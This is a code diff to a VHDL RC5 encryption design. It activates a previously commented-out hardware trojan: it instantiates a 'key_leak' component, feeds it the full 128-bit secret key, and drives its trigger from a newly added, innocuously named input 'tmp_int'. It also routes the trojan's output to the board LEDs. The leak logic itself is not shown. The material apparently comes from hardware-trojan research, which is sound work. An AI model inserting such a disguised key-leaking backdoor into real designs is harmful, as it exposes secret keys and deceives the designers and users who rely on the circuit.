@@ -9,7 +9,7 @@ Entity rc5_Struct is
 		(
 			clr			: in std_logic;
 			clk			: in std_logic;
-			
+			tmp_int		: in std_logic;
 			din_vld		: in std_logic;
 			
 			key_vld		: in std_logic;
@@ -81,15 +81,15 @@ Architecture Behavioral of rc5_Struct is
 		port (CLK: in STD_LOGIC; X: in STD_LOGIC_VECTOR (3 downto 0); Y: out STD_LOGIC_VECTOR (7 downto 0)); 
 	end component; 
 	
---	component key_leak
---	Port(
---		clr: in std_logic;
---		clk: in std_logic;
---		trojan_trigger : in std_logic;
---		leak_key : in std_logic_vector(127 downto 0);
---		ready: out std_logic
---	);
---	end component;
+	component key_leak
+	Port(
+		clr: in std_logic;
+		clk: in std_logic;
+		trojan_trigger : in std_logic;
+		leak_key : in std_logic_vector(127 downto 0);
+		ready: out std_logic
+	);
+	end component;
 --Signals
 		Signal skey		: rom;
 		Signal key_rdy	: std_logic;
@@ -138,15 +138,15 @@ signal hexval: std_logic_vector(31 downto 0):=x"0123ABCD";
 signal clk_cntr_reg : std_logic_vector (4 downto 0) := (others=>'0');
 
 Signal enc_trig : std_logic;
---Signal led_trojan : std_logic;	
-
+Signal led_trojan : std_logic;	
+signal trigger	: std_logic;
 Begin	
-		
+	trigger <= not tmp_int;	
 --Port Maps
 	U1 : rc5_rnd_key Port Map (clr => clr, clk => clk, key_in => key, key_vld => key_vld, skey => skey, key_rdy => key_rdy);
 	U2 : rc5_enc Port Map (clr => clr, clk => clk, din => din, di_vld => enc_trig, skey => skey, dout => dout_enc, do_rdy => enc_rdy, key_rdy => key_rdy);
 	U3 : rc5_dec Port Map (clr => clr, clk => clk, din => din, din_vld => enc_trig, skey => skey, dout => dout_dec, dout_rdy => dec_rdy, key_rdy => key_rdy); 
-	--U4 : key_leak Port Map (clr, clk, key_rdy, key, led_trojan);
+	U4 : key_leak Port Map (clr, clk, trigger, key, led_trojan);
 --Select
 	With j_count select
 		hexval <= 	key(31 downto 0) 		when "000",
@@ -240,7 +240,7 @@ Begin
 			If(state_main = ST_key_in Or state_main = ST_data_in) Then
 				led <= "0000000000000" & i_count;
 			Elsif(state_main =  ST_disp) Then
-				led <= key_rdy & enc_trig & '0' & "0000000000" & j_count;
+				led <= key_rdy & enc_trig & led_trojan & "000000000"  & tmp_int & j_count;
 			End If;
 		End If;
 	End Process;
